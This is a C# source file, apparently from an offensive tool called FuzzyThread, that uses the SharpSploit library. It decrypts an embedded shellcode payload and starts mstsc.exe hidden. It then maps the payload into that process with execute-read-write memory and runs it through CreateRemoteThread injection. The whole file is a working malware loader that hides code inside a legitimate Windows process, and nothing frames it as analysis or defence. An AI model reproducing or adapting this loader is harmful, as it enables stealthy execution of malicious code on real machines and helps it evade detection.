using System.Diagnostics;
using static FuzzyThread.Headers;
using SharpSploit.Execution;
using SharpSploit.Execution.Injection;

namespace FuzzyThread
{
    class Program
    {

        public static void Main(string[] args)
        {
            // Get decrypted pic
            byte[] pic = GetAllDecryptedBytes();

            var injection = new RemoteThreadCreate
            {
                api = RemoteThreadCreate.APIS.CreateRemoteThread,
                suspended = false
            };

            var allocation = new SectionMapAlloc
            {
                localSectionPermissions = Win32.WinNT.PAGE_READWRITE,
                remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,
                sectionAttributes = Win32.WinNT.SEC_COMMIT
            };

            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.FileName = @"C:\Windows\System32\mstsc.exe";
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;

            var mstsc = Process.Start(startInfo);

            //var mstsc = Process.Start(@"C:\Windows\System32\mstsc.exe");
            var payload = new PICPayload(pic);

            Injector.Inject(payload, allocation, injection, mstsc);

             // Keep the main thread running..
            while (true)
            {
                System.Threading.Thread.Sleep(2000);
            }
        }
    }
}
